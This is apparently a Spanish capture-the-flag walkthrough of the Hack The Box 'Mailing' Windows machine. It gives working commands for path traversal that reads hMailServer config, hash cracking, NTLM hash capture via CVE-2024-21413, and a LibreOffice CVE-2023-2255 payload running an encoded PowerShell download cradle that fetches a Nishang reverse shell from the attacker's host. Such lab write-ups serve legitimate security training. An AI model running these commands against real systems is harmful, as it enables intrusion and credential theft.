# Mailing

![](../../../../~gitbook/image.md)Publicado: 18 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Mailing es una máquina Windows de dificultad Easy que simula un entorno corporativo con servicios de correo electrónico. La explotación inicial involucra el descubrimiento de una vulnerabilidad de Local File Inclusion (LFI) en una aplicación web que permite acceder a archivos de configuración sensibles del servidor hMailServer. A través de este vector, obtenemos credenciales del administrador que nos permiten explotar CVE-2024-21413, una vulnerabilidad de autenticación NTLM en hMailServer para capturar hashes NTLMv2.Para la escalada de privilegios, aprovechamos CVE-2023-2255, una vulnerabilidad de control de acceso inadecuado en LibreOffice que permite la ejecución remota de código a través de documentos maliciosos con marcos flotantes incrustados.Técnicas utilizadas:- 🔍 Reconocimiento y enumeración de servicios
- 📁 Local File Inclusion (LFI) / Path Traversal
- 🔐 Cracking de hashes MD5 y NTLMv2
- 📧 Explotación de servicios SMTP
- 🎯 NTLM Relay Attack (CVE-2024-21413)
- 📄 Explotación de LibreOffice (CVE-2023-2255)

#### 🔗 Cadena de explotación
- 🔍 Reconocimiento: Identificación de servicios y aplicación web
- 📁 LFI/Path Traversal: Extracción del archivo de configuración de hMailServer
- 🔐 Cracking: Recuperación de credenciales del administrador
- 📧 CVE-2024-21413: Captura de hash NTLMv2 mediante SMTP malicioso
- 🚪 Acceso inicial: Shell como usuario maya
- 📄 CVE-2023-2255: Escalada mediante documento LibreOffice malicioso
- 👑 Administrador: Shell como localadmin

### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🔍 Escaneo de puertos TCP

#### 🛠️ Enumeración de servicios

#### 🗂️ Resumen de servicios identificados
PuertoServicioDescripción25,465,587SMTPhMailServer - Servicios de correo80HTTPMicrosoft IIS 10.0110,143,993POP3/IMAPServicios de correo445SMBServicios de archivos compartidos5985WinRMAdministración remota de Windows⚠️ Configuración de host virtual
### 🌐 Enumeración Web

#### 🌍 Puerto 80 - HTTP
Revisamos el servicio web y encontramos información sobre lo que parece ser un servicio de correo llamado hMailServer:![](../../../../~gitbook/image.md)Hay un enlace en el que hay un document pdf con unas instrucciones para su descarga, aunque no encontramos nada de utilidad en ellas inicialmente:URL de interés: http://mailing.htb/index.php/login![](../../../../~gitbook/image.md)
#### 🔍 Fuzzing de directorios
Tras probar a realizar fuzzing de directorios con dirsearch encontramos un recurso interesante:
#### 🎯 Análisis del endpoint download.php
URL: http://mailing.htb/download.php![](../../../../~gitbook/image.md)Al acceder recibimos una respuesta que indica que espera parámetros. Analizamos con Burp Suite:![](../../../../~gitbook/image.md)
#### 🔎 Fuzzing de parámetros
Utilizamos ffuf para descubrir parámetros válidos:![](../../../../~gitbook/image.md)✅ Parámetro descubierto: `file`
#### 🔓 Explotación de LFI/Path Traversal
Verificamos que podemos descargar el archivo instructions.pdf legítimo:![](../../../../~gitbook/image.md)
#### 🎯 Extracción de archivos de configuración
Probamos el Path Traversal con archivos del sistema:
#### 📧 Archivo de configuración de hMailServer
Conociendo la estructura típica de hMailServer, intentamos acceder a su archivo de configuración:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🔐 Extracción de credenciales
Hash MD5 encontrado:![](../../../../~gitbook/image.md)
#### 💥 Cracking del hash
![](../../../../~gitbook/image.md)✅ Credenciales obtenidas: `administrator:homenetworkingadministrator`
### 📧 Explotación del Servicio SMTP

#### 🔌 Conexión y autenticación
Probamos las credenciales contra varios servicios sin éxito inicial. Procedemos a autenticarnos en SMTP:
#### 🔒 Codificación de credenciales
Para la autenticación SMTP necesitamos codificar las credenciales en base64:
#### ✅ Autenticación exitosa

### 🎯 Explotación CVE-2024-21413

#### 🔍 Investigación del CVE
CVE-2024-21413 es una vulnerabilidad en hMailServer que permite capturar hashes NTLMv2 mediante el envío de correos maliciosos con enlaces UNC.Referencias:- https://github.com/CMNatic/CVE-2024-21413
- https://github.com/ThemeHackers/CVE-2024-21413

#### 👤 Identificación del objetivo
Según el documento instructions.pdf, el usuario Maya es responsable de revisar los correos:![](../../../../~gitbook/image.md)
#### 🛠️ Preparación del exploit
Paso 1: Descargamos el exploitPaso 2: Configuramos el exploit con nuestros datos:Paso 3: Iniciamos servidor SMB para capturar el hash:Paso 4: Ejecutamos el exploit:![](../../../../~gitbook/image.md)
#### 🎯 Captura del hash NTLMv2
Paso 5: Recibimos el hash de Maya:![](../../../../~gitbook/image.md)
#### 🔓 Cracking del hash NTLMv2
![](../../../../~gitbook/image.md)✅ Credenciales obtenidas: `maya:m4y4ngs4ri`
### 🚪 Acceso Inicial

#### 🔑 Verificación de acceso WinRM

#### 🎉 Shell como usuario Maya

#### 🏁 Primera flag

### 🔝 Escalada de Privilegios

#### 🕵️ Enumeración del sistema
Durante la enumeración encontramos un directorio interesante:
#### 🤔 Comportamiento sospechoso
Al crear archivos en "Important Documents", estos se eliminan automáticamente tras unos segundos:![](../../../../~gitbook/image.md)💡 Observación: Esto sugiere que alguien (posiblemente un usuario administrativo) está monitoreando y procesando archivos en este directorio.
#### 📊 Enumeración de software instalado
Ejecutamos un script PowerShell para listar el software instalado:
#### 🎯 Software vulnerable identificado
LibreOffice 7.4.0.1 - Vulnerable a CVE-2023-2255![](../../../../~gitbook/image.md)
#### 🔓 CVE-2023-2255 - LibreOffice RCE
Descripción: Vulnerabilidad de control de acceso inadecuado en LibreOffice relacionada con "floating frames" (marcos flotantes) en documentos.Exploit público: https://github.com/elweth-sec/CVE-2023-2255
#### 🛠️ Preparación del payload
Paso 1: Creamos comando PowerShell para descarga remota:Paso 2: Codificamos en base64 (UTF-16LE):Paso 3: Preparamos reverse shell (Nishang):Añadimos al final del script:
#### 🚀 Ejecución del exploit
Paso 4: Iniciamos servicios:Paso 5: Generamos documento malicioso:Paso 6: Subimos el documento malicioso:
#### 🎉 Shell como Administrador
Una vez que el usuario abre el archivo malicioso:
#### 🏆 Flag de root

- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [📧 Explotación del Servicio SMTP](#explotacion-del-servicio-smtp)
- [🎯 Explotación CVE-2024-21413](#explotacion-cve-2024-21413)
- [🚪 Acceso Inicial](#acceso-inicial)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.11.14
PING 10.10.11.14 (10.10.11.14) 56(84) bytes of data.
64 bytes from 10.10.11.14: icmp_seq=1 ttl=127 time=41.7 ms
64 bytes from 10.10.11.14: icmp_seq=2 ttl=127 time=45.4 ms

--- 10.10.11.14 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 41.651/43.546/45.441/1.895 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.14 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,52919
```

```
❯ nmap -sC -sV -p$ports 10.10.11.14 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 15:34 CEST
Stats: 0:03:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.96% done; ETC: 15:37 (0:00:00 remaining)
Nmap scan report for 10.10.11.14
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: CAPABILITY IDLE ACL completed SORT OK CHILDREN NAMESPACE RIGHTS=texkA0001 QUOTA IMAP4rev1 IMAP4
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: CAPABILITY IDLE ACL completed SORT OK CHILDREN NAMESPACE RIGHTS=texkA0001 QUOTA IMAP4rev1 IMAP4
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52919/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-18T13:36:50
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

```
echo "10.10.11.14 mailing.htb" | sudo tee -a /etc/hosts
```

```
dirsearch -u http://mailing.htb -x 503,404,403,400

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://mailing.htb/

[15:42:15] Scanning:
[15:42:30] 200 -   541B - /assets/
[15:42:30] 301 -   160B - /assets  ->  http://mailing.htb/assets/
[15:42:36] 400 -    4KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[15:42:38] 200 -    31B - /download.php
[15:42:39] 200 -    5KB - /index.php
[15:42:39] 200 -    5KB - /index.pHp
[15:42:39] 200 -    5KB - /index.php/login/

Task Completed
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://mailing.htb/download.php?FUZZ=key -fs 31
```

```
curl -s -X GET 'http://mailing.htb/download.php?file=instructions.pdf' -o instructions.pdf
```

```
curl -s -X GET 'http://mailing.htb/download.php?file=/../../../../Windows\System32\drivers\etc\hosts'
```

```
curl -s -X GET 'http://mailing.htb/download.php?file=/../../../../../../../Program+Files+(x86)/hmailserver/Bin/hmailserver.ini'
```

```
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
```

```
hashcat -m 0 -a 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt
```

```
telnet 10.10.11.14 25
Trying 10.10.11.14...
Connected to 10.10.11.14.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO mailing.htb
250 Hello.
```

```
echo -n "administrator@mailing.htb" | base64
YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==

echo -n "homenetworkingadministrator" | base64
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
```

```
AUTH LOGIN
334 VXNlcm5hbWU6
YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
334 UGFzc3dvcmQ6
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
235 authenticated.
```

```
wget https://raw.githubusercontent.com/CMNatic/CVE-2024-21413/refs/heads/main/exploit.py
```

```
sender_email = 'administrator@mailing.htb'
receiver_email = 'maya@mailing.htb'
# HTML content con enlace UNC malicioso apuntando a nuestro servidor SMB
html_content = """\

Click me
"""
```

```
impacket-smbserver test $(pwd) -smb2support
```

```
hashcat -m 5600 -a 0 maya_hash /usr/share/wordlists/rockyou.txt
```

```
netexec winrm 10.10.11.14 -u maya -p 'm4y4ngs4ri'
WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
```

```
evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> whoami
mailing\maya
```

```
*Evil-WinRM* PS C:\Users\maya\Desktop> type user.txt
[FLAG_CONTENT]
```

```
*Evil-WinRM* PS C:\> dir

Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
...
d-----        2024-02-27   4:29 PM                Important Documents
...
```

```
$registryPaths = @(
"HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
"HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
"HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
)

$softwareList = foreach ($path in $registryPaths) {
Get-ItemProperty $path -ErrorAction SilentlyContinue |
Where-Object { $_.DisplayName -and $_.DisplayVersion } |
Select-Object DisplayName, DisplayVersion
}

$softwareList | Sort-Object DisplayName | Format-Table -AutoSize
```

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/shell.ps1')
```

```
cat payload | iconv -t utf-16le | base64 -w 0; echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
```

```
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443
```

```
# Servidor web para shell.ps1
python3 -m http.server 80

# Listener para reverse shell
rlwrap nc -nlvp 443
```

```
python3 CVE-2023-2255.py --cmd 'cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=' --output 'exploit.odt'
```

```
*Evil-WinRM* PS C:\Important Documents> upload exploit.odt
Info: Upload successful!
```

```
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.14] 60643
Windows PowerShell running as user localadmin on MAILING

PS C:\Program Files\LibreOffice\program>whoami
mailing\localadmin
```

```
PS C:\Users\localadmin\Desktop> type root.txt
[FLAG_CONTENT]
```
